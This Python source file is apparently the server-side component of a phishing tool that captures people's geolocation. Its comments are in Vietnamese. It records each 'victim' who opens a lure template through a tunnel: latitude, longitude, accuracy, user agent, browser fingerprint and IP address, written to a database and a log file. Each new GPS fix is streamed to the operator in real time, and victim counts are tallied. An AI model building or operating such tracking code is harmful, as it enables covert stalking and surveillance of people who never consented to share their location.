import json
import time
from typing import List, Dict
from core.database import Database
from config import VICTIMS_LOG
from utils.sse_manager import SSEManager

class VictimService:
    def __init__(self, db: Database):
        self.db = db

    def record(self, data: Dict, ip_address: str = None) -> Dict:
        """Ghi nhận nạn nhân, lưu DB + file log."""
        lat = data.get('lat')
        lng = data.get('lng')
        accuracy = data.get('acc', data.get('accuracy'))
        ua = data.get('ua', data.get('user_agent'))
        fingerprint = data.get('fingerprint')
        template_name = data.get('template')
        tunnel_id = data.get('tunnel_id')

        # Validate cơ bản
        is_valid = 1
        if lat is None or lng is None:
            is_valid = 0
        elif abs(lat) > 90 or abs(lng) > 180:
            is_valid = 0
        elif accuracy and accuracy > 10000:
            is_valid = 0

        # Kiểm tra trùng lặp (cùng IP + fingerprint trong 5 phút)
        is_duplicate = 0
        if fingerprint:
            dup_row = self.db.fetchone("""
                SELECT id FROM victims WHERE fingerprint=? AND received_at > datetime('now','-5 minutes')
                ORDER BY received_at DESC LIMIT 1
            """, (fingerprint,))
            if dup_row:
                is_duplicate = 1

        cur = self.db.execute(
            """INSERT INTO victims (tunnel_id, template_name, lat, lng, accuracy,
               user_agent, fingerprint, ip_address, is_valid, is_duplicate)
               VALUES (?,?,?,?,?,?,?,?,?,?)""",
            (tunnel_id, template_name, lat, lng, accuracy, ua, fingerprint, ip_address, is_valid, is_duplicate)
        )
        victim_id = cur.lastrowid

        # Ghi file log (backup)
        log_entry = {
            'id': victim_id,
            'lat': lat,
            'lng': lng,
            'accuracy': accuracy,
            'ua': ua,
            'ip': ip_address,
            'ts': time.time()
        }
        with open(VICTIMS_LOG, 'a', encoding='utf-8') as f:
            f.write(json.dumps(log_entry, ensure_ascii=False) + '\n')

        # Emit SSE
        SSEManager.emit('new_gps', {
            'id': victim_id,
            'lat': lat,
            'lng': lng,
            'accuracy': accuracy,
            'is_valid': is_valid,
            'ip': ip_address
        })

        return log_entry

    def get_recent(self, limit=100, valid_only=False) -> List[Dict]:
        if valid_only:
            rows = self.db.fetchall(
                "SELECT * FROM victims WHERE is_valid=1 ORDER BY received_at DESC LIMIT ?", (limit,))
        else:
            rows = self.db.fetchall("SELECT * FROM victims ORDER BY received_at DESC LIMIT ?", (limit,))
        return [dict(row) for row in rows]

    def get_stats(self) -> Dict:
        total = self.db.fetchone("SELECT COUNT(*) as cnt FROM victims")['cnt']
        today = self.db.fetchone("SELECT COUNT(*) as cnt FROM victims WHERE date(received_at)=date('now')")['cnt']
        return {
            'total': total,
            'today': today
        }
